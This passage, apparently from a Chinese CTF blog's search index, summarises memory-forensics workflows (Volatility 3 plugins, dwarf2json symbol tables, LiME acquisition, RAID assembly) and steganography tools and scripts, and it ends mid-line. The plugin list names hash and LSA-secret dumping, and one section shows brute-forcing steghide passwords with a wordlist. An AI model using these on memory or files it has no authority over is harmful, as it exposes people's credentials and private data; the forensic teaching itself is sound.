chain\nlinux.lsmod.Lsmod                               Lists loaded kernel modules.\nlinux.lsof.Lsof                                 Lists all memory maps for all processes.\nlinux.malfind.Malfind                           Lists process memory ranges that potentially contain injected code.\nlinux.proc.Maps                                 Lists all memory maps for all processes.\nlinux.pslist.PsList                             Lists the processes present in a particular linux memory image.\nlinux.pstree.PsTree                             Plugin for listing processes in a tree based on their parent process ID.\nlinux.tty_check.tty_check                       Checks tty devices for hooks\nmac.bash.Bash                                   Recovers bash command history from memory.\nmac.check_syscall.Check_syscall                 Check system call table for hooks.\nmac.check_sysctl.Check_sysctl                   Check sysctl handlers for hooks.\nmac.check_trap_table.Check_trap_table           Check mach trap table for hooks.\nmac.ifconfig.Ifconfig                           Lists loaded kernel modules\nmac.kauth_listeners.Kauth_listeners             Lists kauth listeners and their status\nmac.kauth_scopes.Kauth_scopes                   Lists kauth scopes and their status\nmac.kevents.Kevents                             Lists event handlers registered by processes\nmac.list_files.List_Files                       Lists all open file descriptors for all processes.\nmac.lsmod.Lsmod                                 Lists loaded kernel modules.\nmac.lsof.Lsof                                   Lists all open file descriptors for all processes.\nmac.malfind.Malfind                             Lists process memory ranges that potentially contain injected code.\nmac.mount.Mount                                 A module containing a collection of plugins that produce data typically foundin Mac's mount command\nmac.netstat.Netstat                             Lists all network connections for all processes.\nmac.proc_maps.Maps                              Lists process memory ranges that potentially contain injected code.\nmac.psaux.Psaux                                 Recovers program command line arguments.\nmac.pslist.PsList                               Lists the processes present in a particular mac memory image.\nmac.pstree.PsTree                               Plugin for listing processes in a tree based on their parent process ID.\nmac.socket_filters.Socket_filters               Enumerates kernel socket filters.\nmac.timers.Timers                               Check for malicious kernel timers.\nmac.trustedbsd.Trustedbsd                       Checks for malicious trustedbsd modules\nmac.vfsevents.VFSevents                         Lists processes that are filtering file system events\ntimeliner.Timeliner                             Runs all relevant plugins that provide time related information and orders the results by time.\nwindows.bigpools.BigPools                       List big page pools.\nwindows.cachedump.Cachedump                     Dumps lsa secrets from memory\nwindows.callbacks.Callbacks                     Lists kernel callbacks and notification routines.\nwindows.cmdline.CmdLine                         Lists process command line arguments.\nwindows.dlllist.DllList                         Lists the loaded modules in a particular windows memory image.\nwindows.driverirp.DriverIrp                     List IRPs for drivers in a particular windows memory image.\nwindows.driverscan.DriverScan                   Scans for drivers present in a particular windows memory image.\nwindows.dumpfiles.DumpFiles                     Dumps cached file contents from Windows memory samples.\nwindows.envars.Envars                           Display process environment variables\nwindows.filescan.FileScan                       Scans for file objects present in a particular windows memory image.\nwindows.getservicesids.GetServiceSIDs           Lists process token sids.\nwindows.getsids.GetSIDs                         Print the SIDs owning each process\nwindows.handles.Handles                         Lists process open handles.\nwindows.hashdump.Hashdump                       Dumps user hashes from memory\nwindows.info.Info                               Show OS & kernel details of the memory sample being analyzed.\nwindows.lsadump.Lsadump                         Dumps lsa secrets from memory\nwindows.malfind.Malfind                         Lists process memory ranges that potentially contain injected code.\nwindows.memmap.Memmap                           Prints the memory map\nwindows.modscan.ModScan                         Scans for modules present in a particular windows memory image.\nwindows.modules.Modules                         Lists the loaded kernel modules.\nwindows.mutantscan.MutantScan                   Scans for mutexes present in a particular windows memory image.\nwindows.netscan.NetScan                         Scans for network objects present in a particular windows memory image.\nwindows.netstat.NetStat                         Traverses network tracking structures present in a particular windows memory image.\nwindows.poolscanner.PoolScanner                 A generic pool scanner plugin.\nwindows.privileges.Privs                        Lists process token privileges\nwindows.pslist.PsList                           Lists the processes present in a particular windows memory image.\nwindows.psscan.PsScan                           Scans for processes present in a particular windows memory image.\nwindows.pstree.PsTree                           Plugin for listing processes in a tree based on their parent process ID.\nwindows.registry.certificates.Certificates      Lists the certificates in the registry's Certificate Store.\nwindows.registry.hivelist.HiveList              Lists the registry hives present in a particular memory image.\nwindows.registry.hivescan.HiveScan              Scans for registry hives present in a particular windows memory image.\nwindows.registry.printkey.PrintKey              Lists the registry keys under a hive or specific key value.\nwindows.registry.userassist.UserAssist          Print userassist registry keys and information.\nwindows.ssdt.SSDT                               Lists the system call table.\nwindows.statistics.Statistics\nwindows.strings.Strings                         Reads output from the strings command and indicates which process(es) each string belongs to.\nwindows.svcscan.SvcScan                         Scans for windows services.\nwindows.symlinkscan.SymlinkScan                 Scans for links present in a particular windows memory image.\nwindows.vadinfo.VadInfo                         Lists process memory ranges.\nwindows.vadyarascan.VadYaraScan                 Scans all the Virtual Address Descriptor memory maps using yara.\nwindows.verinfo.VerInfo                         Lists version information from PE files.\nwindows.virtmap.VirtMap                         Lists virtual mapped sections.\nyarascan.YaraScan                               Scans kernel memory using yara rules (string or file).\n```\n\n\n## Symbol Tables\n\n>文件以JSON数据的形式存储，它们可以是.json的纯JSON文件，也可以是.json.gz或.json.xz的压缩文件。Volatility会在使用时自动解压它们\n\n>Volatility3找不到windows的符号表时，会从Microsoft的Symbol Server下载关联的PDB文件，并将其转换为适当的JSON格式，并将其保存在正确的位置。而linux的符号表需要自己构造，可以通过`dwarf2json`将`DWARF`文件的内核转换为适当的`JSON`文件\n\nMacOS Processing\n\n```bash\n./dwarf2json mac --macho /path/kernel.dSYM/Contents/Resources/DWARF/kernel \\\n    --macho-symbols /path/kernel > output.json\n```\n\nLinux Processing\n\n```bash\n./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-4.4.0-137-generic > output.json\n```\n\n\n### ubuntu\n\nlinux系统默认有vmlinuz，但vmlinux与vmlinuz不同，需要手动安装\n\n**一：安装vmlinux（方法一：apt安装（推荐））**\n\n导入GPG key\n`apt-key adv --keyserver keyserver.ubuntu.com --recv-keys C8CAB6595FDFF622`\n\n添加ddebs存储库\n```bash\ncodename=$(lsb_release -c | awk  '{print $2}')\nsudo tee /etc/apt/sources.list.d/ddebs.list << EOF\ndeb http://ddebs.ubuntu.com/ ${codename}      main restricted universe multiverse\ndeb http://ddebs.ubuntu.com/ ${codename}-security main restricted universe multiverse\ndeb http://ddebs.ubuntu.com/ ${codename}-updates  main restricted universe multiverse\ndeb http://ddebs.ubuntu.com/ ${codename}-proposed main restricted universe multiverse\nEOF\n```\n\n更新软件包\n`apt-get update`\n\n安装kernel debug symbols\n`apt-get install linux-image-$(uname -r)-dbgsym`\n\n\n包含调试信息的文件称为`vmlinuxXXXdebug`，其中`XXX`是内核版本。该文件存储在`/usr/lib/debug/boot`下\n\n![](/img/summary/misc/quzheng-2.png)\n\n\n**一：安装vmlinux（方法二：手动下载安装（不推荐））**\n\n在`http://ddebs.ubuntu.com/pool/main/l/linux/`找到合适的版本后下载到本地\n\n`dpkg -i`安装，安装完成同样在`/usr/lib/debug/boot`目录下\n\n例如：\n\n`dpkg -i linux-image-unsigned-5.15.0-60-generic-dbgsym_5.15.0-60.66_amd64.ddeb`\n\n![](/img/summary/misc/quzheng-3.jpg)\n\n\n**二：导出json**\n\n\n```bash\n./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-5.15.0-60-generic > Ubuntu2004.json\n```\n\n这里要注意内存尽量大于8G，不然会报`已杀死`的错误\n\n![](/img/summary/misc/quzheng-5.png)\n\n\n移动`json`文件到分析机的`volatility3/volatility3/framework/symbols/linux/`\n\n`python3 vol.py -vvvv isfinfo`\n\n![](/img/summary/misc/quzheng-6.png)\n\n\n### centos\n\n**一：安装vmlinux**\n\n```bash\nyum install -y yum-utils\ndebuginfo-install kernel\n```\n\n查找vmlinux文件\n![](/img/summary/misc/quzheng-4.png)\n\n**二：导出json**\n\n同样注意内存不要太小\n\n![](/img/summary/misc/quzheng-7.png)\n\n\n\n\n\n# 内存提取\n\n>完整的内存数据包括两部分: 物理内存数据和页面交换文件数据。\n\n>物理内存通常是一个特殊的内核对象, 比如, 在`Windows`系统中, 物理内存是内核内存区对象, 即 `\\\\Device\\\\PhysicalMemory`; 在`Unix/Linux`系统中, 物理内存为`/dev/mem`和`/dev/kmem`。 只要能读取该内核对象, 就能获取物理内存数据.\n\n>物理机上使用工具比如`Win32dd/Win64dd`,`Memoryze`,`DumpIt`,`FastDump`。在虚拟机上，获取内存是很容易的，你可以暂停VM并取出`.vmem`文件。\n\n\n这里采用[lime](https://github.com/504ensicslabs/lime)制作内存镜像(windows可以用DumpIt)\n\n以centos7为例子\n\n```bash\nyum install -y gcc make gcc-c++ git kernel-devel\ngit clone https://github.com/504ensicsLabs/LiME.git\ncd LiME/src && make\n```\n\n\n如果出现以下报错\n```text\nmake -C /lib/modules/3.10.0-1127.el7.x86_64/build M=\"/root/LiME/src\" modules\nmake: *** /lib/modules/3.10.0-1127.el7.x86_64/build: 没有那个文件或目录。 停止。\nmake: *** [default] 错误 2\n```\n\n说明系统自身的内核版本和`kernel-devel`安装的内核不匹配\n\n使用 uname -r 查询内核版本：`3.10.0-1127.el7.x86_64`\n使用 rpm -qa kernel-devel 查看安装的版本：`kernel-devel-3.10.0-1160.88.1.el7.x86_64`\n\n\n解决方法：`yum upgrade`\n重新编译会生成一个名字和内核版本相同的`.ko`文件\n\n![](/img/summary/misc/quzheng-8.png)\n\n使用lime工具导出内存文件\n\n`insmod ./lime-3.10.0-1160.88.1.el7.x86_64.ko \"path=/root/centos.line format=lime\"`\n\n\n\n# 其他类型\n\n## RAID\n\n比如题目给了RAID格式的磁盘文件\n\n![](/img/summary/misc/quzheng-9.png)\n\n**方法一：使用UFS重组**\n\n[UFS Explorer Professional Recovery 9.18](https://cangshui.net/5257.html)\n\n![](/img/summary/misc/quzheng-10.png)\n\n\n**方法二：用losetup和mdadm进行组装挂载**\n\n```bash\napt install mdadm\n\n# 挂载\nlosetup -fP m8X4exzG.img\nlosetup -fP Fsiq6lKn.img\nlosetup -fP gSoNiXLC.img\nlosetup -fP suPVGqm6.img\nlosetup -fP uGZ85OzT.img\n\n# 查看结果\ncat /proc/mdstat\ndf\n```\n\n![](/img/summary/misc/quzheng-11.png)\n\n如果没有图形化界面，可以通过mount挂载一下\n如果没有自动识别组成raid，则需要使用mdadm手动组装\n\n\n参考文章：\n[内存取证(总结篇)](https://r0fus0d.blog.ffffffff0x.com/post/memory-forensics/)\n[最近遇到的Linux内核内存取证小分析](https://xz.aliyun.com/t/11800)\n\n","tags":["总结","misc","内存取证"],"categories":["总结"]},{"title":"misc总结(隐写篇)","url":"/posts/b9152a17/","content":"\n文中使用的linux工具大部分都可以在[CTF_misc_auto_deploy](https://github.com/dr0n1/CTF_misc_auto_deploy)中一键下载到本地\n\n\n# 图片类\n\n## 0x01 Exif信息隐藏\n\n可交换图像文件格式简称exif，可以记录图片的属性信息和拍摄数据。Exif信息是可以被任意编辑的\n\n```text\nroot@lewiserii-pc:~/桌面# exiftool 1.png\nExifTool Version Number         : 11.88\nFile Name                       : 1.png\nDirectory                       : .\nFile Size                       : 5.4 kB\nFile Modification Date/Time     : 2023:02:21 13:47:49+08:00\nFile Access Date/Time           : 2023:02:21 13:54:17+08:00\nFile Inode Change Date/Time     : 2023:02:21 13:53:15+08:00\nFile Permissions                : rwxrw-rw-\nFile Type                       : PNG\nFile Type Extension             : png\nMIME Type                       : image/png\nImage Width                     : 438\nImage Height                    : 121\nBit Depth                       : 8\nColor Type                      : RGB\nCompression                     : Deflate/Inflate\nFilter                          : Adaptive\nInterlace                       : Noninterlaced\nPixels Per Unit X               : 5669\nPixels Per Unit Y               : 5669\nPixel Units                     : meters\nSoftware                        : Snipaste\nImage Size                      : 438x121\nMegapixels                      : 0.053\n```\n\n提取缩略图\n\n`exiftool -b -ThumbnailImage attachment.jpg >flag.jpg`\n\n## 0x02 文件修复\n\n文件头(尾)被修改或去除，需要修复文件格式\n\n可以借助010 editor的模板 很好用\n\n或者可以自己创建一个文件来比较修改的部分\n\n## 0x03 文件附加\n\n在正常图片中插入额外的文件数据\n\n使用工具`binwalk，foremost，dd`提取出来\n\n```text\nroot@lewiserii-pc:~/桌面# binwalk -e 1.png\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 438 x 121, 8-bit/color RGB, non-interlaced\n91            0x5B            Zlib compressed data, default compression\n\nroot@lewiserii-pc:~/桌面# foremost 1.png\nProcessing: 1.png\n|*|\n```\n\n如果检测到附加的数据，`binwalk`会在当前目录下生成一个`_[文件名].extracted`目录，`foremost`会生成一个`output`目录\n\n在复杂一点的数据插入需要手动提取或使用脚本\n\n## 0x04 cloacked-pixel(需要passwd)\n\nlsb隐写的一种\n支持PNG，JPG，BMP等图片格式\n\n隐写后会转为PNG\n\n```python\n#lsb.py 98 line\nsteg_img.save(imgFile + \"-stego.png\", \"PNG\")\n```\n\n加密\n\n```bash\n$ python lsb.py hide samples/orig.jpg samples/secret.zip p@$5w0rD\n[*] Input image size: 640x425 pixels.\n[*] Usable payload size: 99.61 KB.\n[+] Payload size: 74.636 KB\n[+] Encrypted payload size: 74.676 KB\n[+] samples/secret.zip embedded successfully!\n```\n\n解密\n\n```bash\n$ python lsb.py\nLSB steganogprahy. Hide files within least significant bits of images.\n\nUsage:\n  lsb.py hide <img_file> <payload_file> <password>\n  lsb.py extract <stego_file> <out_file> <password>\n  lsb.py analyse <stego_file>\n```\n\n## 0x05 steghide(可需要passwd)\n\n`steghide`可以将数据隐藏在图像和音频文件中\n\n\n加密\n\n```bash\n# 将secret.txt文件隐藏到text.jpg中\nsteghide embed -cf test.jpg -ef secret.txt -p 123456\n```\n\n解密\n\n```bash\nsteghide extract -sf out.jpg -p 123456\n```\n\n有些题目需要爆破steghide的密码，可以使用pyhton脚本或[stegseek](https://github.com/RickdeJager/stegseek)工具\n\n```bash\n# 不指定wordlist.txt时自动使用`rockyou.txt`（如果系统中有，没有会报错）\nstegseek [stegofile.jpg] [wordlist.txt]\n```\n\n## 0x06 F5-steganography(需要passwd)\n\nF5隐写可以将文件嵌入到BMP、GIF或JPEG图像中，需要java环境\n\n加密\n\n```bash\njava Embed 原图.jpg 生成图.jpg -e 隐藏的文件.txt -p '密码'\n```\n\n解密\n\n```bash\njava Extract out.jpg -p '密码'\n```\n\n特征\n\n![](/img/summary/misc/F5.png)\n\n## 0x07 zsteg\n\nlsb隐写，与steghide类似，可以检测PNG和BMP中的隐藏数据隐藏数据，可以快速提取隐藏信息\n\n\n```bash\nzsteg -a <文件名>\nzsteg -e b8,a,lsb,xy 文件.png -> out.png\n```\n\n## 0x07 outguess(可需要passwd)\n\n加密\n\n```bash\noutguess -k '密码' -d <需要隐藏的内容> 1.jpg 2.jpg\n# 1.jpg会覆盖2.jpg\n```\n\n解密\n\n```bash\noutguess -k '密码' -r <加密的图片>  -t <输出保存的文件>\n```\n\n## 0x08 盲水印\n\n水印又分为单图水印和双图水印\n\n单图水印是指只需要一张图片就能提取出隐藏的信息，双图需要两张图片（一般是原图和加密后的图片，通常两张图片看上去是一样的）\n\n```bash\n# blindwatermark双图盲水印\npython2 bwm.py encode 原图.png 水印图.png 有盲水印的图.png\npython2 bwm.py decode 原图.png 有盲水印的图.png 反解出来的水印图.png\npython3 bwmforpy3.py decode 原图.png 有盲水印的图.png 反解出来的水印图.png\npython3 bwmforpy3.py decode 原图.png 有盲水印的图.png 反解出来的水印图.png --oldseed\n```\n\n\n还有一种特殊的盲水印：`频域盲水印`\n\n```python\nimport cv2\nimport numpy as np\nimport random\nimport os\nfrom argparse import ArgumentParser\n\nALPHA = 5\n\ndef build_parser():\n    parser = ArgumentParser()\n    parser.add_argument('--original', dest='ori', required=True)\n    parser.add_argument('--image', dest='img', required=True)\n    parser.add_argument('--result', dest='res', required=True)\n    parser.add_argument('--alpha', dest='alpha', default=ALPHA)\n    return parser\n\ndef main():\n    parser = build_parser()\n    options = parser.parse_args()\n    ori = options.ori\n    img = options.img\n    res = options.res\n    alpha = options.alpha\n    if not os.path.isfile(ori):\n        parser.error(\"original image %s does not exist.\" % ori)\n    if not os.path.isfile(img):\n        parser.error(\"image %s does not exist.\" % img)\n    decode(ori, img, res, alpha)\n\ndef decode(ori_path, img_path, res_path, alpha):\n    ori = cv2.imread(ori_path)\n    img = cv2.imread(img_path)\n    ori_f = np.fft.fft2(ori)\n    img_f = np.fft.fft2(img)\n    height, width = ori.shape[0], ori.shape[1]\n    watermark = (ori_f - img_f) / alpha\n    watermark = np.real(watermark)\n    res = np.zeros(watermark.shape)\n    random.seed(height + width)\n    x = range(height / 2)\n    y = range(width)\n    random.shuffle(x)\n    random.shuffle(y)\n    for i in range(height / 2):\n        for j in range(width):\n            res[x[i]][y[j]] = watermark[i][j]\n    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])\n\nif __name__ == '__main__':\n    main()\n```\n\n使用\n\n`python pinyubwm.py --original 1.png --image 2.png --result out.png`\n\n\n## 0x09 gnuplot\n\n`gnuplot`可以把坐标画出来\n\n\n坐标格式：`number number`\n\n```text\nplot \"1.txt\"\n```\n\n\n## 0x10 拼图\n\n`montage+gaps`可以将小图片还原成大图片\n\n先用`montage`组合图片\n\n```bash\nmontage input_file -tile 8X6 -geometry +0+0 output_file\n```\n\n`input_file`：可以一张一张指定，也能使用正则匹配(`*.png`)\n`-geometry +0+0`：使图片之间没有间隙\n`-tile 8X6`：以8行6列排列\n`output_file`：输出文件\n\n\n\n\n`gaps`用来还原`montage`命令创建的乱序图像\n\n```bash\ngaps --image=out.jpg --generations=50 --population=120 --size=50\n\n--image            指向拼图的路径\n--size            拼图块的像素尺寸（如果不能明确提供--size的参数，拼图块尺寸将自适应调整）\n--generations    遗传算法的代的数量\n--population    个体数量\n--verbose        每一代训练结束后展示最佳结果\n--save            将拼图还原为图像\n```\n\n{% note [class] [no-icon] [style] %}\n最近gaps更新了\n命令变成了\ngaps run 目标图片 生成图片 参数\n\n例如：gaps run 1.png  2.png --generations=60 --population=100\n{% endnote %}\n\n\n\n\n`montage+gaps`适用于大小相同，数量小的拼图。复杂的需要注意图片名或其他地方是否有顺序提示，还可以注意图片中的冗余位是否可能包含坐标数据\n\n\n\n\n## 0x11 pngcheck\n\nwindows工具，用来检查IDAT块\n\n## 0x12 webp\n\n>webp图片是一种同时提供了有损压缩与无损压缩（可逆压缩）的图片文件格式。webp最初在2010年发布，目标是减少文件大小，但达到和JPEG格式相同的图片质量，希望能够减少图片在网络上的发送时间。\n\n[webp工具官方文档](https://developers.google.com/speed/webp/docs/using?hl=zh-cn)\n\n```bash\ncwebp - 将图片文件压缩为 WebP 文件\ncwebp 1.png -o 2.webp\n\ndwebp - 将 WebP 文件解压缩到图片文件\ndwebp 1.webp -o 2.png\n\ngif2webp - 将 GIF 图片转换为 WebP 格式\ngif2webp 1.gif -o 2.webp\n\nvwebp - 解压缩 WebP 文件，然后在窗口中显示该文件\nvwebp 1.webp\n\nwebpinfo - 输出 WebP 文件的区块级结构以及基本完整性检查\nwebpinfo 1.webp\n```\n\n## 0x13 stegpy(可需要passwd)\n\n加密\n\n```bash\nstegpy 'hello_world' image.png\nstegpy \"hello_world\" image.png -p   //需要密码\n```\n\n解密\n\n```bash\nstegpy _image.png\nstegpy _image.png -p  //需要密码\n```\n\n## 0x14 二维码\n\n二维码类的题目需要对二维码的生成原理有深入了解\n\n[CTF中二维码题目及答题技巧总结（一）](https://li-yang.cn/?p=627)\n\n\n可能有以下考点\n\n1：修复二维码\n\n可能给了一张常规的二维码，但是没有定位符，就需要自己画上去，或者一个大二维码打乱成数个小的二维码，需要还原\n\n\n2：与数织结合\n\n例如祥云杯的`shuffle_code`\n\n\n3：奇奇怪怪的变种二维码\n\n推荐`cortexScan`和中国编码识别\n\n\n## 0x14 GIF\n\nlinux下分帧\n\n```bash\nconvert flag.gif flag.png\n```\n\n\n1：可能在某一帧上有字符\n\n2：帧间隔的秒数\n\n可以用identify分析，如果是两种数字重复可以当二进制转字符串\n\n```bash\n# 显示序号\nidentify -format \"%s %T \\n\" 1.gif\n\n# 不显示序号\nidentify -format \"%T\\n\"\n```\n\n## 0x15 等距提取像素\n\n例如2024浙江省赛决赛-天命人\n\n以 (5,5) 为起点，每隔 10 像素取一个像素点，生成一个宽高约为原图 1/10 的\"抽样缩小图\"\n\n```python\nfrom PIL import Image\n\na = Image.open(\"金箍棒.png\")\nx, y = 5, 5\nx_, y_ = 0, 0\nw, h = a.size\nb = Image.new(a.mode, (w // 10, h // 10))\n\nfor x in range(5, w, 10):\n    for y in range(5, h, 10):\n        print(x, y, x_, y_)\n        b.putpixel((x_, y_), a.getpixel((x, y)))\n        y_ += 1\n    x_ += 1\n    y_ = 0\nb.save('1.png')\n```\n\n或者使用Byxs20的代码\n\n```python\nimport os\nimport re\nimport cv2\nimport argparse\nimport itertools\nimport numpy as np\n\n\nparser = argparse.ArgumentParser()\nparser.add_argument('-f', type=str, default=None, required=True,\n                    help='输入文件名称')\nparser.add_argument('-p', type=str, default=None, required=True,\n                    help='输入左上顶点和右下顶点坐标 (如:-p 220x344+3520x2150)')\nparser.add_argument('-n', type=str, default=None, required=True,\n                    help='输入宽度间隔和高度间隔 (如:-n 44x86)')\nparser.add_argument('-size', type=str, default='1x1', required=False,\n                    help='输入截取图像的大小 (如:-size 7x7)')\nparser.add_argument('-resize', type=int, default=1, required=False,\n                    help='输入截取图像放大倍数 (如:-resize 1)')\nargs  = parser.parse_args()\n\nif __name__ == '__main__':\n    if re.search(r\"^\\d{1,}x\\d{1,}\\+\\d{1,}x\\d{1,}$\", args.p) and re.search(r\"^\\d{1,}x\\d{1,}$\", args.n) and re.search(r\"^\\d{1,}x\\d{1,}$\", args.size):\n        x1, y1 = map(lambda x: int(x), args.p.split(\"+\")[0].split(\"x\"))\n        x2, y2 = map(lambda x: int(x), args.p.split(\"+\")[1].split(\"x\"))\n        width, height = map(lambda x: int(x), args.n.split(\"x\"))\n        width_size, height_size = map(lambda x: int(x), args.size.split(\"x\"))\n\n        img_path = os.path.abspath(args.f)\n        file_name = img_path.split(\"\\\\\")[-1]\n\n        img = cv2.imread(img_path, cv2.IMREAD_COLOR)\n        row, col = img.shape[:2]\n\n        r, c = len(range(y1, y2 + 1, height)), len(range(x1, x2 + 1, width))\n        new_img = np.zeros(shape=(r * height_size * args.resize, c * width_size * args.resize, 3))\n        for y, x in itertools.product(range(r), range(c)):\n            for y_size in range(height_size):\n                for x_size in range(width_size):\n                    # new_img[y * height_size + y_size, x * width_size + x_size] = img[y1 + y * height + y_size, x1 + x * width + x_size]\n                    pt1 = ((x * width_size + x_size) * args.resize, (y * height_size + y_size) * args.resize)\n                    pt2 = ((x * width_size + x_size) * args.resize + args.resize, (y * height_size + y_size) * args.resize + args.resize)\n                    color = img[y1 + y * height + y_size, x1 + x * width + x_size].tolist()\n                    cv2.rectangle(new_img, pt1=pt1, pt2=pt2, color=color, thickness=-1)\n            \n\n        cv2.imwrite(f\"_{file_name}\", new_img)\n        print(\"已保存到运行目录中...\")\n    else:\n        print(\"参数-p或参数-n或参数-size, 输入错误!\")\n```\n\n```bash\npython3 Get_Pixels.py -f 1.png -p 5x5+1915x1075 -n 10x10\n\n# python3 main.py -f 要解密的图片 -p 第一个像素点的XY坐标+最后一个像素点的XY坐标 -n 两个等距像素点的XY距离的差值\n```\n\n\n## 0x16 PixelJihad\n\n[github项目地址](https://github.com/oakes/PixelJihad)\n\n[在线解密](https://sekao.net/pixeljihad/)\n\n\n例如 第三届\"红明谷\"杯网络安全大赛-阿尼亚\n\n\n## 0x16 Arnold猫脸变换\n\n利用Arnold变换（又称猫脸变换）可以对图像进行置乱，使得原本有意义的图像变成一张无意义的图像。该变换可以在其它图像处理前对图像做预处理，例如在数字盲水印嵌入前对水印进行置乱。也可以用于普通的图像加密。 通常一次Arnold变换达不到理想效果，需要对图像进行连续多次的变换。Arnold变换具有周期性，即对图像连续进行Arnold变换，最终又能得到原图像。变换的周期和图像的尺寸有关。 当图像是一张方形的图像时，Arnold变换存在逆变换。经过N次Arnold变换后的数据可以通过N次逆变换恢复数据。 Arnold变换不仅可以用于图像置乱，也可以用于其它数据的置乱和加密。\n\n\n\n已知shuffle_times，a和b参数的恢复脚本：\n\n```python\n# -*- coding: utf-8 -*-\n# @Author  : 1cePeak\n\nimport matplotlib.pyplot as plt\nimport cv2\nimport numpy as np\nfrom PIL import Image\n\nimg = cv2.imread('flag.png')\n\ndef arnold_encode(image, shuffle_times, a, b):\n    \"\"\" Arnold shuffle for rgb image\n    Args:\n        image: input original rgb image\n        shuffle_times: how many times to shuffle\n    Returns:\n        Arnold encode image\n    \"\"\"\n    # 1:创建新图像\n    arnold_image = np.zeros(shape=image.shape)\n\n    # 2：计算N\n    h, w = image.shape[0], image.shape[1]\n    N = h   # 或N=w\n\n    # 3：遍历像素坐标变换\n    for time in range(shuffle_times):\n        for ori_x in range(h):\n            for ori_y in range(w):\n                # 按照公式坐标变换\n                new_x = (1*ori_x + b*ori_y)% N\n                new_y = (a*ori_x + (a*b+1)*ori_y) % N\n\n                # 像素赋值\n                # print(image[ori_x, ori_y, :])\n                # print(arnold_image[new_x, new_y, :])\n                arnold_image[new_x, new_y, :] = image[ori_x, ori_y, :]\n\n        # 更新坐标\n        image = np.copy(arnold_image)\n\n    cv2.imwrite('flag_arnold_encode.png', arnold_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])\n    return arnold_image\n\ndef arnold_decode(image, shuffle_times, a, b):\n    \"\"\" decode for rgb image that encoded by Arnold\n    Args:\n        image: rgb image encoded by Arnold\n        shuffle_times: how many times to shuffle\n    Returns:\n        decode image\n    \"\"\"\n    # 1:创建新图像\n    decode_image = np.zeros(shape=image.shape)\n    # 2：计算N\n    h, w = image.shape[0], image.shape[1]\n    N = h  # 或N=w\n\n    # 3：遍历像素坐标变换\n    for time in range(shuffle_times):\n        for ori_x in range(h):\n            for ori_y in range(w):\n                # 按照公式坐标变换\n                new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N\n                new_y = ((-a) * ori_x + ori_y) % N\n                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]\n\n    cv2.imwrite('flag.png', decode_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])\n    return decode_image\n\n# arnold_encode(img, 1, 2, 3)\narnold_decode(img, 1, 29294, 7302244)\n```\n\n已知a,b 不知道翻转次数爆破脚本\n\n```python\nimport os\nimport cv2\nimport numpy as np\n\ndef de_arnold(img, shuffle_time, a, b):\n    r, c, d = img.shape\n    dp = np.zeros(img.shape, np.uint8)\n\n    for s in range(shuffle_time):\n        for i in range(r):\n            for j in range(c):\n                x = ((a * b + 1) * i - b * j) % r\n                y = (-a * i + j) % c\n                dp[x, y, :] = img[i, j, :]\n        img = np.copy(dp)\n    return img\n\n# 参数设置\na, b = ?,  ? # Arnold变换的参数\nmax_attempts = ? # 爆破的最大尝试次数\noutput_dir = \"decrypted_images\"  # 输出文件夹\nos.makedirs(output_dir, exist_ok=True)\n\n# 读取加密图片\nimg_en = cv2.imread('en_flag.png')\nif img_en is None:\n    raise FileNotFoundError(\"加密图片未找到，请检查路径和文件名是否正确。\")\n\n# 开始爆破\nfor shuffle_time in range(1, max_attempts + 1):\n    img_decrypted = de_arnold(img_en, shuffle_time, a, b)\n    output_path = os.path.join(output_dir, f\"flag_{shuffle_time}.png\")\n    cv2.imwrite(output_path, img_decrypted)\n    print(f\"解密图片已保存: {output_path}\")\n\nprint(f\"爆破完成，共生成 {max_attempts} 张解密图片，保存在文件夹: {output_dir}\")\n```\n\n三个参数都不知道的爆破脚本\n\n```python\nimport matplotlib.pyplot as plt\nimport cv2\nimport numpy as np\n\ndef arnold_decode(image, shuffle_times, a, b):\n    \"\"\" decode for rgb image that encoded by Arnold\n    Args:\n        image: rgb image encoded by Arnold\n        shuffle_times: how many times to shuffle\n    Returns:\n        decode image\n    \"\"\"\n    # 1:创建新图像\n    decode_image = np.zeros(shape=image.shape)\n    # 2：计算N\n    h, w = image.shape[0], image.shape[1]\n    N = h  # 或N=w\n\n    # 3：遍历像素坐标变换\n    for time in range(shuffle_times):\n        for ori_x in range(h):\n            for ori_y in range(w):\n                # 按照公式坐标变换\n                new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N\n                new_y = ((-a) * ori_x + ori_y) % N\n                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]\n        image = np.copy(decode_image)\n\n    return image\n\ndef arnold_brute(image,shuffle_times_range,a_range,b_range):\n    for c in range(shuffle_times_range[0],shuffle_times_range[1]):\n        for a in range(a_range[0],a_range[1]):\n            for b in range(b_range[0],b_range[1]):\n                print(f\"[+] Trying shuffle_times={c} a={a} b={b}\")\n                decoded_img = arnold_decode(image,c,a,b)\n                output_filename = f\"flag_decodedc{c}_a{a}_b{b}.png\"\n                cv2.imwrite(output_filename, decoded_img, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])\n\nif __name__ == \"__main__\":\n    img = cv2.imread(\"cat.png\")\n    arnold_brute(img, (1,8), (1,12), (1,12))\n```\n\n[爆破工具](https://github.com/Alexander17-yang/Anrold-break)\n\n\n# 音频类\n\n## 0x01 MP3stego(需要passwd)\n\n针对`.mp3`文件隐写\n\n`.\\Decode.exe -X -P [password] [stego_mp3]`\n\n会在当前目录下生成一个txt文件\n\n## 0x02 steghide(可需要passwd)\n\n上面提到过的steghide，也能用于音频隐写\n\n## 0x03 Audacity\n\n神器\n\n1.摩斯密码\n\n![](/img/summary/misc/yinpin-1.png)\n\n2.频谱图\n\n![](/img/summary/misc/yinpin-2.png)\n\n3.反向音频\n\n4.波形\n\n## 0x04 minimodem\n\n\n分析wav文件\n\n```bash\nminimodem --rx -f encoded.wav 1200\n```\n\n`--rx`：rx或者r均可，为指定读取模式\n`-f`：读取文件\n`1200`：为bell202 bps对应参数\n\n```text\n//baudmode参考\n{any floating point value N} : Bell202-style at N bps −−ascii\n\n1200 : Bell202 1200 bps −−ascii\n\n300 : Bell103 300 bps −−ascii\n\nrtty : RTTY 45.45 bps −−baudot −−stopbits 